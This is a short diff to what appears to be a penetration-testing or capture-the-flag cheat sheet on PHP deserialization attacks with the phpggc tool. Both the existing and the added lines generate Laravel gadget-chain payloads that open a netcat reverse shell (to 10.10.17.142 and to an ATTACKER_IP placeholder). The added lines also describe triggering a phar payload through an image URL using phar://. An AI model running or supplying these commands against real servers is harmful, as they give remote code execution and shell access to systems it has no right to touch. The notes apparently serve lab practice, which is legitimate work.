@@ -29,6 +29,13 @@ phpggc -l <framework>
 
 # 2. Generate a base64 payload (test multiple gadgets — not all chains work)
 phpggc Laravel/RCE9 system 'nc -nv 10.10.17.142 4444 -e /bin/bash' -b
+
+OR
+
+phpggc -p phar Laravel/RCE9 system 'nc -nv <ATTACKER_IP> 4444 -e /bin/bash' -o exploit.phar
+then you go to the image url and prepend phar://
+so  
+http://url/image?_=phar://image/location
 ```
 
 ---
